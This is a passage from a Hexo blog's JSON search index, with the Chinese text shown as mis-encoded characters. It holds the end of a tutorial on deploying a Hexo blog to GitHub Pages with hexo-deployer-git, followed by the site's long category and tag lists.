Sourceï¼ˆæºï¼‰ä¸‹æ‹‰èœå•é€‰æ‹©å‘å¸ƒæºã€‚ æ³¨æ„ï¼šä½¿ç”¨ç”¨æˆ·æˆ–ç»„ç»‡ä¸»é¡µæ„å»ºçš„ Github Pages ä¸èƒ½ä¿®æ”¹å‘å¸ƒæºï¼Œåªèƒ½ä½¿ç”¨é»˜è®¤çš„ masteråˆ†æ”¯ã€‚ ä¸€é”®éƒ¨ç½²Hexo æä¾›äº†å¿«é€Ÿæ–¹ä¾¿çš„ä¸€é”®éƒ¨ç½²åŠŸèƒ½ï¼Œè®©ä½ åªéœ€ä¸€æ¡å‘½ä»¤å°±èƒ½å°†ç½‘ç«™éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚ åœ¨æ­£å¼éƒ¨ç½²ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆä¿®æ”¹_config.yml æ–‡ä»¶ï¼Œé…ç½®å‚æ•°ã€‚ 12345deploy: type: git repo: &lt;repository url&gt; #https:&#x2F;&#x2F;bitbucket.org&#x2F;JohnSmith&#x2F;johnsmith.bitbucket.io branch: [branch] message: [message] å‚æ•° æè¿° é»˜è®¤å€¼ type deployer - repo é¡¹ç›®åœ°å€ - branch åˆ†æ”¯åç§° gh-pages æœ‰ä»¥ä¸‹ä¸¤ç‚¹éœ€è¦æ³¨æ„ï¼š1.repo éœ€è¦é€‰æ‹©SSH åè®®ï¼ŒHTTPSåè®®ä¼šæŠ¥é”™ã€‚2.branch é€‰æ‹©Github Pagesä¸­è®¾ç½®çš„é‚£ä¸ªåˆ†æ”¯ï¼Œè€Œä¸æ˜¯æ‹‰å–è¿™ä¸ªé¡¹ç›®çš„åˆ†æ”¯ æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯git ä½œä¸º deployerï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å®‰è£…ä¸€ä¸ªæ’ä»¶ã€‚ 1npm install hexo-deployer-git --save ç”Ÿæˆç«™ç‚¹æ–‡ä»¶å¹¶éƒ¨ç½²è‡³è¿œç¨‹åº“ï¼š 1hexo clean &amp;&amp; hexo deploy --generate è‡³æ­¤ï¼Œå°±å®Œæˆäº†ä½¿ç”¨Github Pages éƒ¨ç½² Hexo ä¸ªäººåšå®¢çš„å…¨éƒ¨è¿‡ç¨‹ï¼Œæ€»çš„æ¥è¯´è¿˜æ˜¯å¾ˆé¡ºåˆ©çš„ã€‚ å‚è€ƒé“¾æ¥ Github Pages æ­å»ºæ•™ç¨‹ å°†Hexo éƒ¨ç½²åˆ° GitHub Pages Hexo ä¸€é”®éƒ¨ç½² Github Pageséƒ¨ç½²ä¸ªäººåšå®¢ï¼ˆHexoç¯‡ï¼‰","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]}],"categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/categories/Hexo/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"PHP/Laravel/ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"PHP/ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/categories/PHP/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Ubuntu","slug":"Linux/Ubuntu","permalink":"https://www.0x2beace.com/categories/Linux/Ubuntu/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"},{"name":"Skill","slug":"Mac/Skill","permalink":"https://www.0x2beace.com/categories/Mac/Skill/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Jenkins","slug":"è¿ç»´/Jenkins","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/Jenkins/"},{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"Redis","slug":"PHP/Redis","permalink":"https://www.0x2beace.com/categories/PHP/Redis/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Mac","slug":"Tutorial/Mac","permalink":"https://www.0x2beace.com/categories/Tutorial/Mac/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"},{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/categories/Golang/"},{"name":"å¹´ç»ˆæ€»ç»“","slug":"å¹´ç»ˆæ€»ç»“","permalink":"https://www.0x2beace.com/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"},{"name":"PHP","slug":"Linux/PHP","permalink":"https://www.0x2beace.com/categories/Linux/PHP/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"},{"name":"Tips","slug":"Tips","permalink":"https://www.0x2beace.com/categories/Tips/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"},{"name":"Mac","slug":"Linux/Mac","permalink":"https://www.0x2beace.com/categories/Linux/Mac/"},{"name":"Docker","slug":"Linux/Docker","permalink":"https://www.0x2beace.com/categories/Linux/Docker/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"},{"name":"ç»ˆç«¯","slug":"ç»ˆç«¯","permalink":"https://www.0x2beace.com/categories/%E7%BB%88%E7%AB%AF/"},{"name":"Tutorial","slug":"Docker/Tutorial","permalink":"https://www.0x2beace.com/categories/Docker/Tutorial/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/categories/Socket-io/"},{"name":"Nginx","slug":"Socket-io/Nginx","permalink":"https://www.0x2beace.com/categories/Socket-io/Nginx/"},{"name":"Skill","slug":"Git/Skill","permalink":"https://www.0x2beace.com/categories/Git/Skill/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"},{"name":"Windows","slug":"Skill/Windows","permalink":"https://www.0x2beace.com/categories/Skill/Windows/"},{"name":"Mac","slug":"Skill/Windows/Mac","permalink":"https://www.0x2beace.com/categories/Skill/Windows/Mac/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/categories/Shell/"},{"name":"Tutorial","slug":"PHP/Tutorial","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"PHP/Tutorial/è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Socket.io","slug":"Node/Socket-io","permalink":"https://www.0x2beace.com/categories/Node/Socket-io/"},{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"},{"name":"å‘½ä»¤æ•´ç†","slug":"Linux/å‘½ä»¤æ•´ç†","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Tutorial","slug":"Node/Tutorial","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"Node/Tutorial/è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"},{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Skill","slug":"Tutorial/Skill","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/"},{"name":"GitHub","slug":"Tutorial/Skill/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"}],"tags":[{"name":"åŸŸå","slug":"åŸŸå","permalink":"https://www.0x2beace.com/tags/%E5%9F%9F%E5%90%8D/"},{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/tags/Jenkins/"},{"name":"CD","slug":"CD","permalink":"https://www.0x2beace.com/tags/CD/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"https://www.0x2beace.com/tags/ThinkPHP/"},{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"é¢è¯•","slug":"é¢è¯•","permalink":"https://www.0x2beace.com/tags/%E9%9D%A2%E8%AF%95/"},{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/tags/Golang/"},{"name":"å¹´ç»ˆæ€»ç»“","slug":"å¹´ç»ˆæ€»ç»“","permalink":"https://www.0x2beace.com/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"},{"name":"Composer","slug":"Composer","permalink":"https://www.0x2beace.com/tags/Composer/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"UFW","slug":"UFW","permalink":"https://www.0x2beace.com/tags/UFW/"},{"name":"iptables","slug":"iptables","permalink":"https://www.0x2beace.com/tags/iptables/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"},{"name":"Google Search","slug":"Google-Search","permalink":"https://www.0x2beace.com/tags/Google-Search/"},{"name":"æŒä¹…åŒ–","slug":"æŒä¹…åŒ–","permalink":"https://www.0x2beace.com/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"},{"name":"Google Drive","slug":"Google-Drive","permalink":"https://www.0x2beace.com/tags/Google-Drive/"},{"name":"Crontab","slug":"Crontab","permalink":"https://www.0x2beace.com/tags/Crontab/"},{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"çº¿ç¨‹","slug":"çº¿ç¨‹","permalink":"https://www.0x2beace.com/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"MarkDown","slug":"MarkDown","permalink":"https://www.0x2beace.com/tags/MarkDown/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"},{"name":"Socket","slug":"Socket","permalink":"https://www.0x2beace.com/tags/Socket/"},{"name":"PDO","slug":"PDO","permalink":"https://www.0x2beace.com/tags/PDO/"},{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"},{"name":"Terminal","slug":"Terminal","permalink":"https://www.0x2beace.com/tags/Terminal/"},{"name":"Mysqli","slug":"Mysqli","permalink":"https://www.0x2beace.com/tags/Mysqli/"},{"name":"PHPStorm","slug":"PHPStorm","permalink":"https://www.0x2beace.com/tags/PHPStorm/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"å±€åŸŸç½‘","slug":"å±€åŸŸç½‘","permalink":"https://www.0x2beace.com/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"Postman","slug":"Postman","permalink":"https://www.0x2beace.com/tags/Postman/"},{"name":"JSON","slug":"JSON","permalink":"https://www.0x2beace.com/tags/JSON/"},{"name":"Xdebug","slug":"Xdebug","permalink":"https://www.0x2beace.com/tags/Xdebug/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.0x2beace.com/tags/DevOps/"},{"name":"K8S","slug":"K8S","permalink":"https://www.0x2beace.com/tags/K8S/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"},{"name":"Certbot","slug":"Certbot","permalink":"https://www.0x2beace.com/tags/Certbot/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"},{"name":"ç›‘æ§ç³»ç»Ÿ","slug":"ç›‘æ§ç³»ç»Ÿ","permalink":"https://www.0x2beace.com/tags/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"},{"name":"ç»ˆç«¯","slug":"ç»ˆç«¯","permalink":"https://www.0x2beace.com/tags/%E7%BB%88%E7%AB%AF/"},{"name":"Docker Hub","slug":"Docker-Hub","permalink":"https://www.0x2beace.com/tags/Docker-Hub/"},{"name":"SSH","slug":"SSH","permalink":"https://www.0x2beace.com/tags/SSH/"},{"name":"SSHD","slug":"SSHD","permalink":"https://www.0x2beace.com/tags/SSHD/"},{"name":"GoAccess","slug":"GoAccess","permalink":"https://www.0x2beace.com/tags/GoAccess/"},{"name":"Logs","slug":"Logs","permalink":"https://www.0x2beace.com/tags/Logs/"},{"name":"äº‘","slug":"äº‘","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"},{"name":"Linux Commands","slug":"Linux-Commands","permalink":"https://www.0x2beace.com/tags/Linux-Commands/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"},{"name":"wss","slug":"wss","permalink":"https://www.0x2beace.com/tags/wss/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"},{"name":"WSL","slug":"WSL","permalink":"https://www.0x2beace.com/tags/WSL/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Supervisor","slug":"Supervisor","permalink":"https://www.0x2beace.com/tags/Supervisor/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"Hash","slug":"Hash","permalink":"https://www.0x2beace.com/tags/Hash/"},{"name":"Web å®‰å…¨","slug":"Web-å®‰å…¨","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"},{"name":"ssh","slug":"ssh","permalink":"https://www.0x2beace.com/tags/ssh/"},{"name":"PM2","slug":"PM2","permalink":"https://www.0x2beace.com/tags/PM2/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.0x2beace.com/tags/JavaScript/"}]}